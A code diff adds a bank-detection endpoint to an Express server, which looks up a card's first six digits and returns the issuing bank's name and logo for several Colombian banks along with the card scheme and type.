@@ -1,6 +1,7 @@
 import express from 'express';
 import cors from 'cors';
 import dotenv from 'dotenv';
+import lookup from 'binlookup';
 
 dotenv.config();
 
@@ -38,6 +39,65 @@ setInterval(() => {
 // SERVIR ARCHIVOS ESTÁTICOS
 // ============================================
 app.use(express.static('.'));
+
+// ============================================
+// DETECTAR BANCO POR BIN
+// ============================================
+const binLookup = lookup();
+
+app.post('/api/detect-bank', async (req, res) => {
+  try {
+    const { cardNumber } = req.body;
+    if (!cardNumber || cardNumber.length < 6) {
+      res.status(400).json({ ok: false, error: 'Tarjeta inválida' });
+      return;
+    }
+
+    const bin = cardNumber.substring(0, 6);
+    binLookup(bin).then((data) => {
+      const bankLogos = {
+        'Bancolombia': 'https://upload.wikimedia.org/wikipedia/commons/thumb/4/4c/Bancolombia_logo.svg/1200px-Bancolombia_logo.svg.png',
+        'Banco Popular': 'https://upload.wikimedia.org/wikipedia/commons/thumb/5/5e/Banco_Popular_Colombia_logo.png/1200px-Banco_Popular_Colombia_logo.png',
+        'Banco Occidente': 'https://upload.wikimedia.org/wikipedia/commons/thumb/3/3a/Banco_de_Occidente_logo.svg/1200px-Banco_de_Occidente_logo.svg.png',
+        'Davivienda': 'https://upload.wikimedia.org/wikipedia/commons/thumb/9/93/Davivienda_logo.svg/1200px-Davivienda_logo.svg.png',
+        'DaviBank': 'https://upload.wikimedia.org/wikipedia/commons/thumb/9/93/Davivienda_logo.svg/1200px-Davivienda_logo.svg.png',
+        'ITAU': 'https://upload.wikimedia.org/wikipedia/commons/thumb/9/9b/Ita%C3%BA_logo.svg/1200px-Ita%C3%BA_logo.svg.png',
+        'Banco de Bogotá': 'https://upload.wikimedia.org/wikipedia/commons/thumb/1/1a/Logo_Banco_de_Bogota.svg/1200px-Logo_Banco_de_Bogota.svg.png',
+        'Nequi': 'https://upload.wikimedia.org/wikipedia/commons/thumb/6/6f/Nequi_logo.svg/1200px-Nequi_logo.svg.png'
+      };
+
+      let bankName = data.bank?.name || 'Banco Desconocido';
+      let bankLogo = 'data:image/svg+xml,%3Csvg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 60%22%3E%3Crect fill=%22%23ccc%22 width=%22100%22 height=%2260%22/%3E%3Ctext x=%2250%22 y=%2230%22 text-anchor=%22middle%22 fill=%22%23999%22 font-size=%2214%22%3EBanco%3C/text%3E%3C/svg%3E';
+
+      // Buscar logo correspondiente
+      for (const [key, logo] of Object.entries(bankLogos)) {
+        if (bankName.includes(key) || key.includes(bankName)) {
+          bankLogo = logo;
+          break;
+        }
+      }
+
+      res.json({
+        ok: true,
+        bank: bankName,
+        logo: bankLogo,
+        scheme: data.scheme,
+        type: data.type,
+        brand: data.brand
+      });
+    }).catch((error) => {
+      console.error('Error detectando banco:', error);
+      res.json({
+        ok: true,
+        bank: 'Banco Desconocido',
+        logo: 'data:image/svg+xml,%3Csvg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 60%22%3E%3Crect fill=%22%23ccc%22 width=%22100%22 height=%2260%22/%3E%3Ctext x=%2250%22 y=%2230%22 text-anchor=%22middle%22 fill=%22%23999%22 font-size=%2214%22%3EBanco%3C/text%3E%3C/svg%3E'
+      });
+    });
+  } catch (error) {
+    console.error('❌ Error en detect-bank:', error);
+    res.status(500).json({ ok: false, error: error.message });
+  }
+});
 
 // ============================================
 // NOTIFICAR MATRÍCULA AGREGADA
